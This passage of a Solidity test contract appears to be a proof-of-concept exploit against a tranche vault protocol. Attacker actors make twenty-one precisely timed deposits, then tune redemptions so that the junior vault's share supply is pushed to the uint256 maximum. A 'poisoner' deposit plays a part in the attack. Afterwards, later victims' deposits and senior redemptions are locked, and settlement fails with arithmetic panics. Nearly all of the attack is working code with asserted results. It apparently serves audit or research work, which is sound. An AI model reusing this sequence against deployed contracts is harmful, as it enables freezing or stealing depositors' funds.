        _eq(seniorVault.totalSupply(), SENIOR_RAW_AFTER_CLAIMS, "senior raw after claims");
        _eq(pool.seniorPrincipal(), CONSTRUCTION_SENIOR, "initial senior");
        _eq(pool.juniorPrincipal(), CONSTRUCTION_JUNIOR, "initial junior");
        _eq(pool.lastSeniorCouponCheckpointTime(), CONSTRUCTION_START, "construction checkpoint");
    }

    function _buildH272Precursor()
        internal
        returns (uint256 attackerStart, uint256 attackerEnd, uint256 deposited, uint256 cycles)
    {
        uint256 alignmentShares = _executeFrozenDeposit(
            backgroundJunior,
            ALIGNMENT_ASSETS,
            CONSTRUCTION_START,
            ALIGNMENT_ACTIVATION,
            ALIGNMENT_ACTIVATION
        );
        _eq(alignmentShares, ALIGNMENT_SHARES, "alignment shares");
        _eq(pool.seniorPrincipal(), 4_000_036_528_940, "alignment senior");
        _eq(pool.juniorPrincipal(), 1_004_054_894_335, "alignment junior");
        _eq(juniorVault.totalSupply(), 1_004_278_369_072_744, "alignment raw");
        _eq(ALIGNED_MONDAY, 1_892_214_000, "aligned Monday pin");

        uint256[20] memory requestTimes = [
            uint256(1_892_205_896),
            1_892_213_773,
            1_892_221_651,
            1_892_229_528,
            1_892_237_405,
            1_892_245_282,
            1_892_253_159,
            1_892_261_035,
            1_892_268_912,
            1_892_276_788,
            1_892_284_664,
            1_892_292_540,
            1_892_300_416,
            1_892_308_292,
            1_892_316_167,
            1_892_324_043,
            1_892_331_918,
            1_892_339_793,
            1_892_347_668,
            1_892_355_542
        ];
        uint256[20] memory activations = [
            uint256(1_892_206_800),
            1_892_217_600,
            1_892_224_800,
            1_892_232_000,
            1_892_239_200,
            1_892_246_400,
            1_892_253_600,
            1_892_264_400,
            1_892_271_600,
            1_892_278_800,
            1_892_286_000,
            1_892_293_200,
            1_892_304_000,
            1_892_311_200,
            1_892_318_400,
            1_892_325_600,
            1_892_332_800,
            1_892_343_600,
            1_892_350_800,
            1_892_358_000
        ];
        uint256[20] memory targets = [
            uint256(1_892_213_096),
            1_892_220_973,
            1_892_228_851,
            1_892_236_728,
            1_892_244_605,
            1_892_252_482,
            1_892_260_359,
            1_892_268_235,
            1_892_276_112,
            1_892_283_988,
            1_892_291_864,
            1_892_299_740,
            1_892_307_616,
            1_892_315_492,
            1_892_323_367,
            1_892_331_243,
            1_892_339_118,
            1_892_346_993,
            1_892_354_868,
            1_892_362_742
        ];

        attackerStart = requestTimes[0];
        for (uint256 i = 0; i < requestTimes.length; ++i) {
            _executeFrozenDeposit(
                couponAttacker, COUPON_DEPOSIT, requestTimes[i], activations[i], targets[i]
            );
            deposited += COUPON_DEPOSIT;
            ++cycles;
        }

        _executeFrozenDeposit(
            calibrationAttacker,
            FINAL_DEPOSIT,
            1_892_362_742,
            1_892_365_200,
            1_892_367_381
        );
        deposited += FINAL_DEPOSIT;
        ++cycles;
        attackerEnd = block.timestamp;

        _eq(cycles, 21, "cycles");
        _eq(deposited, 17_000e6, "deposited");
        _eq(attackerEnd, H272_EXPECTED_END, "H272 end");
        _eq(attackerEnd - CONSTRUCTION_START, H272_ELAPSED, "H272 chronology");
        _eq(pool.juniorPrincipal(), H272_EXPECTED_JUNIOR, "H272 junior");
        _eq(pool.seniorPrincipal(), H272_EXPECTED_SENIOR, "H272 senior");
        _eq(juniorVault.totalSupply(), H272_EXPECTED_RAW_SUPPLY, "H272 raw supply");
        _eq(juniorVault.accruedTotalSupply(), H272_EXPECTED_RAW_SUPPLY, "H272 accrued supply");
        _eq(juniorVault.pendingMaintenanceFeeShares(), 0, "H272 pending fee");
        _eq(engine.lastMarkPrice(), 2e8, "H272 mark");
        _require(!engine.terminalNavSnapshot().hasOpenPositions, "H272 positions");
        _eq(
            juniorVault.balanceOf(address(couponAttacker)) + juniorVault.balanceOf(address(calibrationAttacker)),
            H272_EXPECTED_ATTACKER_SHARES,
            "H272 attacker shares"
        );
        _require(
            block.timestamp >= juniorVault.lastDepositTime(address(couponAttacker)) + juniorVault.DEPOSIT_COOLDOWN(),
            "tune holder cooldown"
        );
    }

    function _executeFrozenDeposit(
        AF013Actor actor,
        uint256 assets,
        uint256 requestTime,
        uint256 activation,
        uint256 target
    )
        internal
        returns (uint256 shares)
    {
        _require(requestTime >= block.timestamp, "request chronology");
        _require(target > block.timestamp, "coupon target");
        vm.warp(requestTime);
        _refreshMark();
        uint256 requestId = actor.mintAndRequestDeposit(token, juniorVault, assets);
        _eq(requestId, activation / 1 hours, "frozen deposit epoch");
        _eq(juniorVault.depositEpochStart(requestId), activation, "frozen activation");
        _require(activation <= target, "coupon epoch");
        vm.warp(target);
        _refreshMark();
        _require(!pool.isOracleFrozen(), "frozen coupon target");
        _settle();
        _eq(juniorVault.pendingMaintenanceFeeShares(), 0, "coupon pending fee");
        shares = _claimFull(actor, juniorVault, requestId, assets);
    }

    function _executeActivationAwareTerminal() internal {
        uint256 requestEpoch;
        (requestEpoch,) = juniorVault.getRequestEpochWindow();
        uint256 activation = juniorVault.depositEpochStart(requestEpoch);
        _eq(requestEpoch, 525_658, "terminal epoch");
        _eq(activation, TERMINAL_ACTIVATION, "terminal activation");
        _eq(activation - block.timestamp, 1_419, "activation gap");
        _require(juniorVault.balanceOf(address(couponAttacker)) >= TUNE_BURN_SHARES, "tune balance");
        _eq(seniorVault.balanceOf(address(seniorLp)), SENIOR_LP_SHARES, "senior LP balance");
        _eq(seniorVault.maxRequestRedeem(address(seniorLp)), SENIOR_LP_SHARES, "senior LP unlocked");

        _refreshMark();
        uint256 seniorExitRequest = seniorLp.requestRedeem(seniorVault, SENIOR_LP_SHARES);
        uint256 tuneRequest = couponAttacker.requestRedeem(juniorVault, TUNE_BURN_SHARES);
        uint256 victimRequest = victim.mintAndRequestDeposit(token, juniorVault, 1e6);
        uint256 poisonRequest = poisoner.mintAndRequestDeposit(token, juniorVault, 9e6);
        _eq(seniorExitRequest, requestEpoch, "senior exit epoch");
        _eq(tuneRequest, requestEpoch, "tune request epoch");
        _eq(victimRequest, requestEpoch, "victim request epoch");
        _eq(poisonRequest, requestEpoch, "poison request epoch");

        vm.warp(activation);
        _refreshMark();
        (uint256 activationSenior, uint256 activationJunior,,) = pool.getPendingTrancheState();
        _eq(activationSenior, ACTIVATION_SENIOR, "activation senior");
        _eq(activationJunior, ACTIVATION_JUNIOR, "activation junior");
        _eq(pool.getFreeAssets(), PRE_TERMINAL_FREE_ASSETS, "pre-terminal free assets");
        _eq(H272_EXPECTED_RAW_SUPPLY - TUNE_BURN_SHARES, TUNED_RAW_SUPPLY, "tuned raw");
        uint256 postRedeem = activationJunior - TUNE_BURN_ASSETS;
        _eq(postRedeem, POST_REDEEM_JUNIOR, "post redeem junior");
        uint256 victimQuote = juniorVault.quoteDepositFromState(1e6, postRedeem, TUNED_RAW_SUPPLY, 0);
        uint256 cumulativeQuote = juniorVault.quoteDepositFromState(10e6, postRedeem, TUNED_RAW_SUPPLY, 0);
        _eq(victimQuote, VICTIM_QUOTE, "victim quote");
        _eq(cumulativeQuote, EQUALITY_MINT, "cumulative quote");
        _eq(type(uint256).max - TUNED_RAW_SUPPLY, EQUALITY_MINT, "headroom");

        _settle();
        _eq(
            seniorVault.claimableRedeemRequest(seniorExitRequest, address(seniorLp)),
            SENIOR_LP_SHARES,
            "senior exit shares"
        );
        _eq(
            seniorVault.claimableRedeemAssets(seniorExitRequest, address(seniorLp)),
            SENIOR_EXIT_ASSETS,
            "senior exit assets"
        );
        _eq(pool.seniorPrincipal(), REMAINING_SENIOR, "remaining senior");
        _eq(seniorVault.totalSupply(), REMAINING_SENIOR_RAW, "remaining senior raw");
        _eq(pool.juniorPrincipal(), POST_REDEEM_JUNIOR + 10e6, "terminal junior with deposits");
        _eq(
            ACTIVATION_JUNIOR - ((REMAINING_SENIOR + 3) / 4),
            JUNIOR_WITHDRAWAL_CAPACITY,
            "junior withdrawal capacity"
        );
        _eq(PRE_TERMINAL_FREE_ASSETS - SENIOR_EXIT_ASSETS, POST_SENIOR_EXIT_FREE_ASSETS, "post-senior free assets");
        _eq(POST_SENIOR_EXIT_FREE_ASSETS - TUNE_BURN_ASSETS, POST_BOTH_REDEEMS_FREE_ASSETS, "post-both free assets");
        _eq(seniorVault.convertToAssets(SENIOR_VICTIM_SHARES), SENIOR_VICTIM_VALUE, "senior victim value");
        _eq(juniorVault.claimableRedeemRequest(tuneRequest, address(couponAttacker)), TUNE_BURN_SHARES, "tune shares");
        _eq(juniorVault.claimableRedeemAssets(tuneRequest, address(couponAttacker)), TUNE_BURN_ASSETS, "tune assets");
        _eq(juniorVault.claimableDepositRequest(victimRequest, address(victim)), 1e6, "victim claimable");
        _eq(juniorVault.claimableDepositRequest(poisonRequest, address(poisoner)), 9e6, "poison claimable");
        _eq(juniorVault.totalSupply(), type(uint256).max, "equality supply");

        uint256 seniorReturned = seniorLp.claimRedeem(seniorVault, seniorExitRequest, SENIOR_LP_SHARES);
        _eq(seniorReturned, SENIOR_EXIT_ASSETS, "senior returned");
        uint256 tuneReturned = couponAttacker.claimRedeem(juniorVault, tuneRequest, TUNE_BURN_SHARES);
        _eq(tuneReturned, TUNE_BURN_ASSETS, "tune returned");
        uint256 victimShares = juniorVault.claimableDepositShares(victimRequest, address(victim));
        uint256 poisonShares = juniorVault.claimableDepositShares(poisonRequest, address(poisoner));
        _eq(EQUALITY_MINT - victimShares - poisonShares, 1, "allocation dust");
        _claimFull(victim, juniorVault, victimRequest, 1e6);
        _claimFull(poisoner, juniorVault, poisonRequest, 9e6);
        _eq(juniorVault.totalSupply(), type(uint256).max - 1, "post-claim supply");
        _eq(juniorVault.depositClaimEscrowShares(), 0, "deposit escrow");
        _eq(juniorVault.pendingMaintenanceFeeShares(), 0, "terminal pending fee");

        uint256 lockedRequest = laterVictim.mintAndRequestDeposit(token, juniorVault, 10_000e6);
        uint256 seniorVictimShares = seniorVault.balanceOf(address(seniorVictim));
        _require(seniorVictimShares > 0, "senior victim shares");
        uint256 seniorRequest = seniorVictim.requestRedeem(seniorVault, seniorVictimShares);
        _eq(seniorRequest, lockedRequest, "locked epoch");

        uint256 lockedActivation = juniorVault.depositEpochStart(lockedRequest);
        vm.warp(lockedActivation);
        _refreshMark();
        _expectPanicStatic(address(juniorVault), abi.encodeWithSignature("convertToAssets(uint256)", 1));
        _expectPanicStatic(address(juniorVault), abi.encodeWithSignature("estimateDepositShares(uint256)", 1e6));
        _expectPanicCall(
            address(victim),
            abi.encodeCall(AF013Actor.requestRedeem, (juniorVault, juniorVault.balanceOf(address(victim))))
        );

        (bool cancelOk, bytes memory cancelData) =
            address(laterVictim).call(abi.encodeCall(AF013Actor.cancelDeposit, (juniorVault, lockedRequest)));
        _require(!cancelOk, "mature deposit cancelled");
        _eq(
            uint256(keccak256(cancelData)),
            uint256(keccak256(abi.encodeWithSelector(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector))),
            "cancel error"
        );

        (bool settleOk, bytes memory settleData) =
            address(keeper).call(abi.encodeCall(AF013Actor.settle, (router, _updateData())));
        _require(!settleOk, "terminal settlement succeeded");
        _require(_isArithmeticPanic(settleData), "settlement error");
        _eq(juniorVault.pendingDepositRequest(lockedRequest, address(laterVictim)), 10_000e6, "locked deposit");
        _eq(juniorVault.claimableDepositRequest(lockedRequest, address(laterVictim)), 0, "locked claimable");
        _eq(
            seniorVault.pendingRedeemRequest(seniorRequest, address(seniorVictim)), seniorVictimShares, "senior pending"
        );
        _eq(seniorVault.claimableRedeemAssets(seniorRequest, address(seniorVictim)), 0, "senior claimable");

        emit AF013Metric("activation_gap", 1_419);
        emit AF013Metric("activation_coupon", H272_EXPECTED_JUNIOR - ACTIVATION_JUNIOR);
        emit AF013Metric("senior_exit_assets", SENIOR_EXIT_ASSETS);
        emit AF013Metric("junior_withdrawal_capacity", JUNIOR_WITHDRAWAL_CAPACITY);
        emit AF013Metric("senior_victim_value", SENIOR_VICTIM_VALUE);
        emit AF013Metric("tune_burn_assets", TUNE_BURN_ASSETS);
        emit AF013Metric("tune_burn_shares", TUNE_BURN_SHARES);
        emit AF013Metric("equality_mint", EQUALITY_MINT);
        emit AF013Metric("final_raw_supply", juniorVault.totalSupply());
        emit AF013Metric("locked_junior_assets", 10_000e6);
        emit AF013Metric("locked_senior_shares", seniorVictimShares);
    }

    function _executeCausalControl() internal {
        AF013VirtualOffsetGuard safe = new AF013VirtualOffsetGuard(token, TUNED_RAW_SUPPLY);
        AF013VirtualOffsetGuard toxic = new AF013VirtualOffsetGuard(token, TUNED_RAW_SUPPLY);
        AF013Actor safeActor = new AF013Actor();
        AF013Actor toxicActor = new AF013Actor();
        _require(safeActor.tryGuard(safe, token, 1e6, VICTIM_QUOTE), "safe guard rejected");
        _eq(safe.rawSupply(), TUNED_RAW_SUPPLY + VICTIM_QUOTE, "safe guard supply");
        uint256 toxicBefore = token.balanceOf(address(toxicActor));
        _require(!toxicActor.tryGuard(toxic, token, 10e6, EQUALITY_MINT), "toxic guard accepted");
        _eq(toxic.rawSupply(), TUNED_RAW_SUPPLY, "toxic guard supply");
        _eq(token.balanceOf(address(toxicActor)) - toxicBefore, 10e6, "toxic guard refund");
    }

    function _claimFull(AF013Actor actor, TrancheVault vault, uint256 requestId, uint256 assets)
        internal
        returns (uint256 shares)
    {
        _eq(vault.claimableDepositRequest(requestId, address(actor)), assets, "claimable deposit");
        shares = actor.claimDeposit(vault, requestId, assets);
        _require(shares > 0, "zero deposit shares");
    }

    function _refreshMark() internal {
        keeper.refresh(router, _updateData());
    }

    function _settle() internal {
        keeper.settle(router, _updateData());
    }

    function _updateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = abi.encode(uint256(1e8));
    }

    function _expectPanicStatic(address target, bytes memory data) internal view {
        (bool ok, bytes memory result) = target.staticcall(data);
        _require(!ok && _isArithmeticPanic(result), "expected static panic");
    }

    function _expectPanicCall(address target, bytes memory data) internal {
        (bool ok, bytes memory result) = target.call(data);
        _require(!ok && _isArithmeticPanic(result), "expected call panic");
    }

    function _isArithmeticPanic(bytes memory data) internal pure returns (bool) {
        if (data.length != 36) return false;
        bytes4 selector;
        uint256 code;
        assembly ("memory-safe") {
            selector := mload(add(data, 32))
            code := mload(add(data, 36))
        }
        return selector == 0x4e487b71 && code == 0x11;
    }

    function _require(bool condition, string memory label) internal pure {
        require(condition, label);
    }

    function _eq(uint256 actual, uint256 expected, string memory label) internal pure {
        require(actual == expected, label);
    }

    function _eq(bytes32 actual, bytes32 expected, string memory label) internal pure {
        require(actual == expected, label);
    }
}

```

